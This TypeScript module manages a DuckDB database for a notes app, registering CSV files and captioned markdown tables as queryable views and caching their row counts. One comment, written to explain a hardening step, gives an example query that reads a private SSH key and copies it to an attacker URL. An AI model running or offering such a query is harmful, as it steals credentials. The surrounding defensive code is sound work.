import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import YAML from 'yaml';
import { DuckDBInstance, type DuckDBConnection } from '@duckdb/node-api';
import {
  indexCsvTable, unindexCsvTable, unindexAllCsvTables,
  indexMarkdownTable, unindexMarkdownTable, unindexAllNoteTables,
  type CsvTableColumn,
} from '../graph/index';
import { parseMarkdown, type ParsedTable } from '../graph/parser';
import { isIgnoredEntry } from '../../shared/ignored-dirs';
import { slugifyTableName } from '../../shared/table-name';
import { serializeCsv } from '../../shared/csv-parse';
import type { ProjectContext } from '../project-context-types';
import { createProjectStore } from '../project-store';
import { loadCsvSchema, buildReadCsvSql } from './csv-schema';
import { logger } from '../../shared/logger';

interface TablesState {
  rootPath: string;
  instance: DuckDBInstance;
  connection: DuckDBConnection;
  /** relativePath → tableName for the currently-registered CSV views. */
  pathToTable: Map<string, string>;
  /** tableName → relativePath, so we can detect + warn on collisions. */
  tableToPath: Map<string, string>;
  /**
   * notePath → the captioned markdown tables registered from that note (#1357).
   * A note can hold several captioned tables; `tableIndex` is the position in
   * the note's full `parsed.tables` list (captioned or not), matching the
   * graph's positional `…/table/<index>` addressing.
   */
  noteTables: Map<string, { name: string; tableIndex: number; caption: string }[]>;
  /**
   * tableName → notePath. Shares the identifier namespace with `tableToPath`
   * so a markdown table can't collide with a CSV (or another note table).
   */
  tableToNote: Map<string, string>;
  /**
   * relativePath → the last `COUNT(*)` computed for that CSV, stamped with the
   * file's mtime + size at the moment of counting (#2227).
   *
   * A CSV is registered as a *lazy view*, so every `COUNT(*)` re-reads and
   * re-sniffs the whole file. `listTables` runs on `TABLES_LIST`, on the
   * `describe_tables` LLM tool, and on every `TABLES_CHANGED` broadcast — and
   * `TABLES_CHANGED` fires for things that have nothing to do with any CSV
   * (a note save that touches a captioned table, a menu-driven index rebuild,
   * a new window). Measured on 8 CSVs totalling 40.8MB, the counts were 262ms
   * of a 278ms `listTables`; the `information_schema` half was 8ms. So the
   * count is the whole cost, and re-paying it for a file nobody touched is
   * pure waste.
   *
   * mtime+size is the invalidation key rather than a content hash because
   * hashing would re-read the file — the exact cost being avoided. It has a
   * known hole: a same-second, same-size rewrite on a coarse-mtime filesystem
   * reads as unchanged. That hole is closed in practice from the other side —
   * `registerCsv` drops the entry outright, and the watcher calls it for the
   * CSV itself *and* for a sibling `.csv.schema.yaml` / companion `.md` edit
   * (which can change the row count without touching the CSV at all, e.g.
   * `header: false`). The stat check is the backstop for edits that happen
   * with no watcher running, not the primary signal.
   */
  csvRowCounts: Map<string, { mtimeMs: number; size: number; rowCount: number }>;
}

// Dispose closes the in-memory DuckDB (connection then instance) before the
// state is dropped. closeSync is synchronous, so `disposeProject` stays sync.
const store = createProjectStore<TablesState>({
  dispose: (state) => {
    try { state.connection.closeSync(); } catch { /* already closed */ }
    try { state.instance.closeSync(); } catch { /* already closed */ }
  },
});

function getState(ctx: ProjectContext): TablesState | null {
  return store.get(ctx);
}

export type QueryResult =
  | { ok: true; columns: string[]; rows: Record<string, unknown>[] }
  | { ok: false; error: string };

export interface TableInfo {
  name: string;
  /** CSV file path for `source: 'csv'`; the source note's path for `'note'`. */
  relativePath: string;
  columns: string[];
  rowCount: number;
  /** Where the table came from — a standalone `.csv` file or a note's `Table:` caption (#1359). */
  source: 'csv' | 'note';
  /** Note tables only: the raw human caption, to label the row + jump to the table. */
  caption?: string;
  /** Note tables only: position in the note's `parsed.tables` list. */
  tableIndex?: number;
}

/** Open an in-memory DuckDB for the given project. Idempotent per project. */
export async function initTablesDb(ctx: ProjectContext): Promise<void> {
  if (store.has(ctx)) return;
  const instance = await DuckDBInstance.create(':memory:');
  const connection = await instance.connect();
  await hardenConnection(connection);
  store.set(ctx, {
    rootPath: ctx.rootPath,
    instance,
    connection,
    pathToTable: new Map(),
    tableToPath: new Map(),
    noteTables: new Map(),
    tableToNote: new Map(),
    csvRowCounts: new Map(),
  });
}

/**
 * Lock down a fresh DuckDB connection before any query runs (#1325).
 *
 * The same connection backs the Query Panel AND note-embedded ```sql
 * compute cells, so an untrusted thoughtbase's cell can run arbitrary
 * SQL here. DuckDB's `httpfs` extension autoloads on first use of an
 * `https://`/`s3://` path, which turns a query into a network
 * exfiltration primitive (`COPY (SELECT … FROM read_text('~/.ssh/id_rsa'))
 * TO 'https://attacker/…'`). Disabling extension autoinstall/autoload
 * removes that egress path entirely while leaving the core built-ins the
 * CSV pipeline relies on (`read_csv_auto`, `read_csv`) fully functional —
 * they need no extension.
 *
 * Local file *read* via core built-ins (`read_text`, `read_csv_auto` of an
 * arbitrary path) is a core capability we can't drop without breaking CSV
 * views; that residual is covered by the per-project compute trust gate
 * (`renderer/lib/app/compute-ops.ts`). This is the network half of the
 * defense-in-depth pair.
 */
async function hardenConnection(connection: DuckDBConnection): Promise<void> {
  await connection.run(
    'SET autoinstall_known_extensions=false; SET autoload_known_extensions=false;',
  );
}

export function disposeProject(ctx: ProjectContext): void {
  // The DuckDB close runs synchronously inside the store's dispose hook, so
  // this stays a sync teardown even though `dispose` returns a promise.
  void store.dispose(ctx);
}

/**
 * Execute `sql` and return rows as plain JS objects suitable for structured
 * clone across the IPC boundary. Malformed SQL or runtime errors come back
 * as `{ ok: false, error }` — never thrown.
 */
export async function runQuery(ctx: ProjectContext, sql: string): Promise<QueryResult> {
  const state = getState(ctx);
  if (!state) return { ok: false, error: 'Tables DB is not initialized' };
  try {
    const reader = await state.connection.runAndReadAll(sql);
    const columns = reader.columnNames();
    const rows = reader.getRowObjectsJS() as Record<string, unknown>[];
    return { ok: true, columns, rows };
  } catch (err) {
    return { ok: false, error: err instanceof Error ? err.message : String(err) };
  }
}

// ── CSV pipeline (#233) ─────────────────────────────────────────────────────

/**
 * Derive a DuckDB-safe table name from a CSV's relative path.
 * `notes/data/2024-experiment.csv` → `notes_data_2024_experiment`.
 * Identifiers that would start with a digit get a `t_` prefix.
 */
export function deriveTableName(relativePath: string): string {
  // Strip the CSV extension, then apply the shared identifier sanitizer so the
  // CSV and markdown-table (#1356) paths agree on names + collide in one namespace.
  return slugifyTableName(relativePath.replace(/\.csv$/i, ''));
}

/**
 * Read a companion markdown note alongside the CSV (same dir, matching stem).
 * If the frontmatter declares `table_name:`, return it as the SQL identifier.
 * Returns null if no companion exists, no frontmatter, or no override.
 */
async function readCompanionOverride(rootPath: string, relativePath: string): Promise<string | null> {
  const dir = path.dirname(relativePath);
  const stem = path.basename(relativePath, path.extname(relativePath));
  const companionRel = dir === '.' ? `${stem}.md` : `${dir}/${stem}.md`;
  const companionAbs = path.join(rootPath, companionRel);
  let content: string;
  try {
    content = await fs.readFile(companionAbs, 'utf-8');
  } catch {
    return null;
  }
  const m = content.match(/^---\n([\s\S]*?)\n---/);
  if (!m) return null;
  try {
    const fm = YAML.parse(m[1]!) as Record<string, unknown> | null;
    const raw = fm?.table_name;
    if (typeof raw === 'string' && raw.trim().length > 0) {
      // Run the user-supplied override through the same sanitizer so a
      // whitespace-happy YAML value can't produce an invalid identifier.
      return deriveTableName(raw);
    }
  } catch {
    /* malformed YAML — ignore, fall back to the derived name */
  }
  return null;
}

/**
 * Information surfaced when two CSVs derive the same table name and
 * the second is skipped (#354). Callers route this to a renderer
 * toast so the user can fix the conflict via `table_name:` in a
 * companion .md.
 */
export interface CsvTableCollision {
  /** Table name both CSVs derived. */
  tableName: string;
  /** Path that was registered first and won. */
  existingPath: string;
  /** Path that was skipped to avoid the clobber. */
  attemptedPath: string;
}

export type RegisterCsvResult =
  | { ok: true }
  | { ok: false; reason: 'collision'; collision: CsvTableCollision }
  | { ok: false; reason: 'inactive' }
  | { ok: false; reason: 'error'; error: unknown };

export type RegisterTableResult =
  | { ok: true; name: string }
  | { ok: false; reason: 'collision'; collision: CsvTableCollision }
  | { ok: false; reason: 'inactive' }
  | { ok: false; reason: 'uncaptioned' }
  | { ok: false; reason: 'error'; error: unknown };

/**
 * Per-project collision-listener registry (#354). Listeners are
 * attached by window-manager so each window sees collisions for its
 * own project, including those produced during the init-time
 * `registerAllCsvs` sweep (when the window-manager isn't yet calling
 * registerCsv itself).
 */
type CollisionListener = (c: CsvTableCollision) => void;
const collisionListeners = new Map<string, Set<CollisionListener>>();

export function onCsvTableCollision(rootPath: string, listener: CollisionListener): () => void {
  let set = collisionListeners.get(rootPath);
  if (!set) { set = new Set(); collisionListeners.set(rootPath, set); }
  set.add(listener);
  return () => {
    const s = collisionListeners.get(rootPath);
    if (!s) return;
    s.delete(listener);
    if (s.size === 0) collisionListeners.delete(rootPath);
  };
}

function emitCollision(rootPath: string, c: CsvTableCollision): void {
  const set = collisionListeners.get(rootPath);
  if (!set) return;
  for (const fn of set) {
    try { fn(c); } catch (err) { logger('tables').error('collision listener threw:', err); }
  }
}

/**
 * Register (or re-register) a CSV file as a DuckDB view. The view is lazy —
 * DuckDB re-reads the file on every query — so content changes don't require
 * re-registration. Re-register is called when the file is added or when the
 * companion note's `table_name:` may have changed.
 *
 * Returns a result indicating outcome. Callers that own a renderer
 * window should surface `collision` results as a toast — the
 * console.warn alone wasn't visible to users (#354).
 */
export async function registerCsv(ctx: ProjectContext, relativePath: string): Promise<RegisterCsvResult> {
  const state = getState(ctx);
  if (!state) return { ok: false, reason: 'inactive' };
  const { rootPath, connection, pathToTable, tableToPath } = state;
  // Primary invalidation for the row-count cache (#2227). The watcher calls
  // this for the CSV itself *and* for a sibling schema/companion edit, so it
  // is the one signal that sees every way a row count can change — including
  // the ones mtime+size can't (a `header: false` sidecar re-parse).
  state.csvRowCounts.delete(relativePath);
  const override = await readCompanionOverride(rootPath, relativePath);
  const tableName = override ?? deriveTableName(relativePath);

  // If another path already claimed this table name, warn and skip rather
  // than silently clobbering whichever one loaded first.
  const existingPath = tableToPath.get(tableName);
  if (existingPath && existingPath !== relativePath) {
    logger('tables').warn(
      `Table name collision: '${tableName}' would be used by both ` +
      `'${existingPath}' and '${relativePath}'. Skipping the second. Use ` +
      `'table_name:' in a companion .md to disambiguate.`,
    );
    const collision = { tableName, existingPath, attemptedPath: relativePath };
    emitCollision(rootPath, collision);
    return { ok: false, reason: 'collision', collision };
  }

  // If this path was previously registered under a different name (e.g. the
  // companion override was just added or changed), drop the old view first.
  const previousName = pathToTable.get(relativePath);
  if (previousName && previousName !== tableName) {
    try {
      await connection.run(`DROP VIEW IF EXISTS "${previousName}"`);
    } catch { /* tolerate the rare rename race */ }
    tableToPath.delete(previousName);
    unindexCsvTable(ctx, previousName);
  }

  const absPath = path.join(rootPath, relativePath);
  // Look for an explicit schema declaration (#237). When present, we
  // call `read_csv(…, columns={…})` so the user's pinned types win
  // over DuckDB's auto-inference. When absent, fall back to
  // `read_csv_auto(…)` — schema-less CSVs are still loaded the
  // same way they always were.
  const schema = await loadCsvSchema(rootPath, relativePath);
  const escapedPath = absPath.replace(/'/g, "''");
  const readExpr = schema
    ? buildReadCsvSql(absPath, schema)
    : `read_csv_auto('${escapedPath}')`;
  try {
    await connection.run(
      `CREATE OR REPLACE VIEW "${tableName}" AS SELECT * FROM ${readExpr}`,
    );
    pathToTable.set(relativePath, tableName);
    tableToPath.set(tableName, relativePath);
    // Reflect the shape into the knowledge graph (CSVW + OWL). This
    // lets SPARQL consumers ask "what tables do I have?", "what columns
    // does X expose?", and reason about column datatypes.
    await indexCsvTableShape(ctx, relativePath, tableName);
    return { ok: true };
  } catch (err) {
    logger('tables').warn(
      `Failed to register '${relativePath}' as '${tableName}': ` +
      (err instanceof Error ? err.message : String(err)),
    );
    return { ok: false, reason: 'error', error: err };
  }
}

/**
 * Fetch column names + DuckDB types from information_schema and write
 * the corresponding CSVW/OWL triples to the graph. Failures here log but
 * don't throw — the CSV is still queryable via SQL even if the graph
 * entry didn't land.
 */
async function indexCsvTableShape(ctx: ProjectContext, relativePath: string, tableName: string): Promise<void> {
  const state = getState(ctx);
  if (!state) return;
  const safeName = tableName.replace(/'/g, "''");
  try {
    const reader = await state.connection.runAndReadAll(
      `SELECT column_name, data_type, ordinal_position ` +
      `FROM information_schema.columns ` +
      `WHERE table_name = '${safeName}' AND table_schema = 'main' ` +
      `ORDER BY ordinal_position`,
    );
    const rows = reader.getRowObjectsJS() as Record<string, unknown>[];
    const columns: CsvTableColumn[] = rows.map((r) => ({
      name: String(r.column_name),
      duckdbType: String(r.data_type),
      // ordinal_position is 1-based in DuckDB; we publish 0-based.
      index: Number(r.ordinal_position) - 1,
    }));
    indexCsvTable(ctx, { tableName, relativePath, columns });
  } catch (err) {
    logger('tables').warn(
      `Failed to index '${tableName}' into graph: ` +
      (err instanceof Error ? err.message : String(err)),
    );
  }
}

/** Drop the view for a CSV path. No-op if the path was never registered. */
export async function unregisterCsv(ctx: ProjectContext, relativePath: string): Promise<void> {
  const state = getState(ctx);
  if (!state) return;
  const { connection, pathToTable, tableToPath } = state;
  const tableName = pathToTable.get(relativePath);
  if (!tableName) return;
  try {
    await connection.run(`DROP VIEW IF EXISTS "${tableName}"`);
  } catch { /* view may already be gone */ }
  pathToTable.delete(relativePath);
  tableToPath.delete(tableName);
  // Leak guard, not correctness (#2227): a re-listing can only follow a
  // re-registration, and `registerCsv` drops the entry itself, so no test can
  // isolate this line — it exists so a long session that adds and deletes CSVs
  // doesn't accumulate a count per path it will never look at again.
  state.csvRowCounts.delete(relativePath);
  unindexCsvTable(ctx, tableName);
}

// ── Markdown tables (#1357) ─────────────────────────────────────────────────

/**
 * Materialize a captioned markdown table into the shared DuckDB as a real
 * TABLE (not a VIEW — an embedded table has no backing file to `read_csv`
 * lazily). The rows are serialized to CSV text and loaded through DuckDB's
 * CSV sniffer so **type inference matches the standalone-`.csv` path** (a
 * numeric column comes back numeric).
 *
 * Opt-in: only tables carrying a `name` (from a `Table: <caption>` line, #1356)
 * are registered; uncaptioned tables stay graph-only and return `uncaptioned`.
 *
 * Names share one identifier namespace with CSV tables and other note tables,
 * so a clash is skipped + surfaced via the same collision toast (#354). CSV
 * tables win — callers register all CSVs before note tables (see #1358).
 *
 * Precondition: the caller has already dropped this note's prior tables (via
 * `unregisterNoteTables`) — `reregisterNoteTables` does this. A lingering
 * entry for `notePath` therefore means a sibling table in the same note
 * already claimed the name (two identical captions), which is also skipped.
 */
export async function registerMarkdownTable(
  ctx: ProjectContext,
  notePath: string,
  table: ParsedTable,
  tableIndex: number,
): Promise<RegisterTableResult> {
  const state = getState(ctx);
  if (!state) return { ok: false, reason: 'inactive' };
  const { rootPath, connection, tableToPath, tableToNote, noteTables } = state;
  const tableName = table.name;
  if (!tableName) return { ok: false, reason: 'uncaptioned' };

  const existingPath = tableToPath.get(tableName) ?? tableToNote.get(tableName);
  if (existingPath) {
    logger('tables').warn(
      `Table name collision: '${tableName}' from note '${notePath}' ` +
      `is already used by '${existingPath}'. Skipping the markdown table. ` +
      `Rename the 'Table:' caption to disambiguate.`,
    );
    const collision = { tableName, existingPath, attemptedPath: notePath };
    // A same-note duplicate (both paths identical) is a user typo, not a
    // cross-source clash — skip it quietly rather than firing a confusing toast.
    if (existingPath !== notePath) emitCollision(rootPath, collision);
    return { ok: false, reason: 'collision', collision };
  }

  // Round-trip the cells through a temp CSV so DuckDB's sniffer types them.
  const csvText = serializeCsv(table.headers, table.rows);
  const tmpPath = path.join(os.tmpdir(), `minerva-mdtable-${crypto.randomUUID()}.csv`);
  try {
    await fs.writeFile(tmpPath, csvText, 'utf-8');
    const escaped = tmpPath.replace(/'/g, "''");
    // header=true: we always emit a header row, so don't leave it to sniffing.
    // null_padding=true: tolerate short rows in a hand-written markdown table.
    await connection.run(
      `CREATE OR REPLACE TABLE "${tableName}" AS SELECT * FROM ` +
      `read_csv_auto('${escaped}', header=true, null_padding=true)`,
    );
    const entries = noteTables.get(notePath) ?? [];
    entries.push({ name: tableName, tableIndex, caption: table.caption ?? tableName });
    noteTables.set(notePath, entries);
    tableToNote.set(tableName, notePath);
    // Mirror the CSV path's graph overlay so SPARQL sees a typed, named table
    // node joined back to the note (#1360). Non-fatal — the table is queryable
    // via SQL even if the graph write is skipped.
    await indexMarkdownTableShape(ctx, notePath, tableName, tableIndex, table.caption ?? tableName);
    return { ok: true, name: tableName };
  } catch (err) {
    logger('tables').warn(
      `Failed to register markdown table '${tableName}' from ` +
      `'${notePath}': ` + (err instanceof Error ? err.message : String(err)),
    );
    return { ok: false, reason: 'error', error: err };
  } finally {
    await fs.rm(tmpPath, { force: true }).catch(() => { /* best-effort cleanup */ });
  }
}

/** Drop every DuckDB table registered from a note. No-op if none were. */
export async function unregisterNoteTables(ctx: ProjectContext, notePath: string): Promise<void> {
  const state = getState(ctx);
  if (!state) return;
  const { connection, noteTables, tableToNote } = state;
  const entries = noteTables.get(notePath);
  if (!entries) return;
  for (const { name } of entries) {
    try {
      await connection.run(`DROP TABLE IF EXISTS "${name}"`);
    } catch { /* table may already be gone */ }
    tableToNote.delete(name);
    unindexMarkdownTable(ctx, name); // drop the graph overlay too (#1360)
  }
  noteTables.delete(notePath);
}

/**
 * Fetch column names + DuckDB types from information_schema for a registered
 * markdown table and write the graph-parity overlay (#1360). Mirrors
 * `indexCsvTableShape`; failures log but don't throw — the table is still
 * SQL-queryable even if the graph entry didn't land.
 */
async function indexMarkdownTableShape(
  ctx: ProjectContext,
  notePath: string,
  tableName: string,
  tableIndex: number,
  caption: string,
): Promise<void> {
  const state = getState(ctx);
  if (!state) return;
  const safeName = tableName.replace(/'/g, "''");
  try {
    const reader = await state.connection.runAndReadAll(
      `SELECT column_name, data_type, ordinal_position ` +
      `FROM information_schema.columns ` +
      `WHERE table_name = '${safeName}' AND table_schema = 'main' ` +
      `ORDER BY ordinal_position`,
    );
    const rows = reader.getRowObjectsJS() as Record<string, unknown>[];
    const columns: CsvTableColumn[] = rows.map((r) => ({
      name: String(r.column_name),
      duckdbType: String(r.data_type),
      index: Number(r.ordinal_position) - 1,
    }));
    indexMarkdownTable(ctx, { tableName, notePath, tableIndex, caption, columns });
  } catch (err) {
    logger('tables').warn(
      `Failed to index markdown table '${tableName}' into graph: ` +
      (err instanceof Error ? err.message : String(err)),
    );
  }
}

/**
 * Re-parse a note and re-register its captioned tables: drop the note's prior
 * tables, then register each captioned one afresh. This is the entry the file
 * watcher + boot sweep call (#1358); a note edit can add/remove/rename a
 * caption or change rows, so a full drop-then-register keeps DuckDB in sync.
 */
export async function reregisterNoteTables(
  ctx: ProjectContext,
  notePath: string,
  content: string,
): Promise<{ count: number; collisions: CsvTableCollision[]; changed: boolean }> {
  const state = getState(ctx);
  if (!state) return { count: 0, collisions: [], changed: false };
  // Whether the note owned any tables before this pass — combined with the new
  // count/collisions below, lets the watcher skip a TABLES_CHANGED broadcast
  // when an ordinary (caption-less) note is saved.
  const hadBefore = state.noteTables.has(notePath);
  await unregisterNoteTables(ctx, notePath);
  const parsed = parseMarkdown(content);
  let count = 0;
  const collisions: CsvTableCollision[] = [];
  for (let i = 0; i < parsed.tables.length; i++) {
    const table = parsed.tables[i]!;
    if (!table.name) continue; // uncaptioned → graph-only, skip SQL registration
    const result = await registerMarkdownTable(ctx, notePath, table, i);
    if (result.ok) count++;
    else if (result.reason === 'collision') collisions.push(result.collision);
  }
  return { count, collisions, changed: hadBefore || count > 0 || collisions.length > 0 };
}

/**
 * Scan the thoughtbase on project open and register every `.csv` file under
 * the root. Mirrors graph.indexAllNotes's walker shape.
 *
 * Returns the count of successfully-registered CSVs plus any
 * collisions encountered. Callers route collisions to a renderer
 * toast (#354).
 */
export async function registerAllCsvs(ctx: ProjectContext): Promise<{ count: number; collisions: CsvTableCollision[] }> {
  const state = getState(ctx);
  if (!state) return { count: 0, collisions: [] };
  const { rootPath } = state;
  // Wipe stale CSV-table triples up front so CSVs deleted while the app
  // was closed don't linger in the graph after a full rescan. Each
  // registered CSV writes its own triples as it goes.
  unindexAllCsvTables(ctx);
  let count = 0;
  const collisions: CsvTableCollision[] = [];
  async function walk(dirPath: string) {
    let entries: import('node:fs').Dirent[];
    try {
      entries = await fs.readdir(dirPath, { withFileTypes: true });
    } catch {
      return;
    }
    for (const entry of entries) {
      if (isIgnoredEntry(entry.name)) continue;
      const fullPath = path.join(dirPath, entry.name);
      if (entry.isDirectory()) {
        await walk(fullPath);
      } else if (entry.isFile() && entry.name.toLowerCase().endsWith('.csv')) {
        const rel = path.relative(rootPath, fullPath);
        const result = await registerCsv(ctx, rel);
        if (result.ok) count++;
        else if (result.reason === 'collision') collisions.push(result.collision);
      }
    }
  }
  await walk(rootPath);
  return { count, collisions };
}

/**
 * Scan the thoughtbase on project open and register every captioned markdown
 * table (#1358). Mirrors `registerAllCsvs`'s walker. **Must run after
 * `registerAllCsvs`** so a CSV and a note table that derive the same name
 * resolve deterministically — the CSV wins and the note table is skipped.
 *
 * Returns the count of registered tables plus collisions (routed to the same
 * toast as CSV collisions).
 */
export async function registerAllNoteTables(ctx: ProjectContext): Promise<{ count: number; collisions: CsvTableCollision[] }> {
  const state = getState(ctx);
  if (!state) return { count: 0, collisions: [] };
  const { rootPath } = state;
  // Wipe stale markdown-table overlays up front (mirrors registerAllCsvs) so a
  // note deleted while the app was closed doesn't linger in the graph; each
  // registered table rewrites its own overlay below.
  unindexAllNoteTables(ctx);
  // Drop any DuckDB note tables from a previous sweep too — the walk below only
  // revisits notes that still exist.
  for (const notePath of [...state.noteTables.keys()]) {
    await unregisterNoteTables(ctx, notePath);
  }
  let count = 0;
  const collisions: CsvTableCollision[] = [];
  async function walk(dirPath: string) {
    let entries: import('node:fs').Dirent[];
    try {
      entries = await fs.readdir(dirPath, { withFileTypes: true });
    } catch {
      return;
    }
    for (const entry of entries) {
      if (isIgnoredEntry(entry.name)) continue;
      const fullPath = path.join(dirPath, entry.name);
      if (entry.isDirectory()) {
        await walk(fullPath);
      } else if (entry.isFile() && entry.name.toLowerCase().endsWith('.md')) {
        const rel = path.relative(rootPath, fullPath);
        let content: string;
        try {
          content = await fs.readFile(fullPath, 'utf-8');
        } catch {
          continue;
        }
        const result = await reregisterNoteTables(ctx, rel, content);
        count += result.count;
        collisions.push(...result.collisions);
      }
    }
  }
  await walk(rootPath);
  return { count, collisions };
}

/**
 * Ordered column names for **every** table in the `main` schema, in one query
 * (#2227). This replaced an `information_schema` query per table.
 *
 * Cheap on purpose: DuckDB resolves a view's column list when the view is
 * created and keeps it in the catalog, so reading `information_schema` does
 * NOT re-open the backing CSV. Measured across 8 CSVs totalling 40.8MB:
 * 8 per-table queries 8.2ms, this single sweep 2.0ms. The saving here is
 * round-trips, not file I/O — that half of the issue's cost model was wrong,
 * and the `COUNT(*)`s below are where the 262ms actually went.
 *
 * A failed query yields an empty map rather than throwing, matching what the
 * per-table version did: a table whose columns we can't read lists with
 * `columns: []` instead of blanking the whole panel.
 */
async function allTableColumns(ctx: ProjectContext): Promise<Map<string, string[]>> {
  const out = new Map<string, string[]>();
  const r = await runQuery(ctx,
    `SELECT table_name, column_name FROM information_schema.columns ` +
    `WHERE table_schema = 'main' ORDER BY table_name, ordinal_position`,
  );
  if (!r.ok) return out;
  for (const row of r.rows) {
    const table = String(row.table_name);
    let cols = out.get(table);
    if (!cols) { cols = []; out.set(table, cols); }
    cols.push(String(row.column_name));
  }
  return out;
}

/**
 * `COUNT(*)` for the given tables in a single `UNION ALL` (#2227), so N
 * uncached tables cost one round-trip and let DuckDB overlap the scans rather
 * than serializing them. Measured on 8 CSVs / 40.8MB: 262ms sequential →
 * 165ms batched, before the cache above removes most of them entirely.
 *
 * **Falls back to per-table counts if the batch fails.** One unreadable table
 * (a CSV deleted between the `readdir` and the query, a schema sidecar that
 * no longer parses) aborts the whole `UNION ALL`, which would report `0 rows`
 * for every *healthy* table too — a visibly wrong panel, not a slow one. The
 * per-table version degraded to zero for the one bad table only, and that
 * behaviour is preserved by paying the slow path in the rare failure case.
 *
 * Counts arrive as BigInt from DuckDB, so every read goes through `Number()`
 * before it reaches a `TableInfo` — `rowCount` crosses the IPC boundary and a
 * raw BigInt there throws in `JSON.stringify`.
 */
async function countRows(ctx: ProjectContext, names: string[]): Promise<Map<string, number>> {
  const out = new Map<string, number>();
  if (names.length === 0) return out;
  const batched = await runQuery(ctx, names
    .map((n) => `SELECT '${n.replace(/'/g, "''")}' AS table_name, COUNT(*) AS n FROM "${n}"`)
    .join(' UNION ALL '));
  if (batched.ok) {
    for (const row of batched.rows) out.set(String(row.table_name), Number(row.n ?? 0));
    return out;
  }
  for (const n of names) {
    const one = await runQuery(ctx, `SELECT COUNT(*) AS n FROM "${n}"`);
    out.set(n, one.ok ? Number(one.rows[0]?.n ?? 0) : 0);
  }
  return out;
}

/**
 * Every registered table — standalone `.csv` files and captioned markdown
 * tables (#1359) — with its name, source, relative path, columns, and row
 * count. Both kinds live in one DuckDB connection, so this is the single
 * source of truth the Tables panel and SQL autocomplete read.
 *
 * **Query count is bounded, not proportional to the table count (#2227).**
 * This used to run two sequential queries per table — one `information_schema`
 * lookup and one `COUNT(*)` — so a 40-CSV thoughtbase meant 80 serialized
 * round-trips and 40 full CSV re-parses on *every* `TABLES_CHANGED`. It is now
 * at most two queries total: one column sweep, plus one batched count covering
 * whichever tables actually need recounting. A refresh where no CSV changed
 * and no note tables exist is a single query.
 */
export async function listTables(ctx: ProjectContext): Promise<TableInfo[]> {
  const state = getState(ctx);
  if (!state) return [];
  const columnsByTable = await allTableColumns(ctx);

  // Which CSVs still need a count? Stat is microseconds against a CSV parse
  // that is milliseconds-to-seconds, so checking all of them to skip most is
  // an easy trade. A stat failure counts as "stale" so the count query (and
  // its fallback) decides what a vanished file means, rather than silently
  // serving whatever number we last cached for it.
  const csvTables = [...state.pathToTable.entries()];
  const stats = await Promise.all(csvTables.map(([rel]) =>
    fs.stat(path.join(state.rootPath, rel)).catch((err: unknown) => {
      // ENOENT is the ordinary race — the file went away between registration
      // and this refresh, and the watcher's `unregisterCsv` hasn't landed yet.
      // A permissions or IO error is not ordinary and shouldn't reach the user
      // as a silent `0 rows`, so it gets a line before falling through to the
      // same "recount it" path.
      if ((err as NodeJS.ErrnoException | null)?.code !== 'ENOENT') {
        logger('tables').warn(`Could not stat '${rel}' for its row-count cache:`, err);
      }
      return null;
    })));
  const cachedCounts = new Map<string, number>();
  const needCount: string[] = [];
  const restamp: { rel: string; name: string; mtimeMs: number; size: number }[] = [];
  csvTables.forEach(([rel, name], i) => {
    const stat = stats[i];
    const cached = state.csvRowCounts.get(rel);
    if (stat && cached && cached.mtimeMs === stat.mtimeMs && cached.size === stat.size) {
      cachedCounts.set(name, cached.rowCount);
      return;
    }
    needCount.push(name);
    if (stat) restamp.push({ rel, name, mtimeMs: stat.mtimeMs, size: stat.size });
  });

  // Note tables are real in-memory TABLEs, not lazy views, so their COUNT(*)
  // reads row-group metadata rather than re-parsing anything — they ride along
  // in the same batched query instead of earning a cache of their own.
  const noteTableNames = [...state.noteTables.values()].flatMap((e) => e.map((t) => t.name));
  const counted = await countRows(ctx, [...needCount, ...noteTableNames]);
  for (const { rel, name, mtimeMs, size } of restamp) {
    const rowCount = counted.get(name);
    if (rowCount !== undefined) state.csvRowCounts.set(rel, { mtimeMs, size, rowCount });
  }

  const rowsFor = (name: string) => cachedCounts.get(name) ?? counted.get(name) ?? 0;
  const out: TableInfo[] = [];
  for (const [relativePath, name] of csvTables) {
    out.push({
      name, relativePath, columns: columnsByTable.get(name) ?? [],
      rowCount: rowsFor(name), source: 'csv',
    });
  }
  for (const [notePath, entries] of state.noteTables.entries()) {
    for (const { name, tableIndex, caption } of entries) {
      out.push({
        name, relativePath: notePath, columns: columnsByTable.get(name) ?? [],
        rowCount: rowsFor(name), source: 'note', caption, tableIndex,
      });
    }
  }
  // Group by file, then by name so multiple tables in one note order stably.
  out.sort((a, b) => a.relativePath.localeCompare(b.relativePath) || a.name.localeCompare(b.name));
  return out;
}
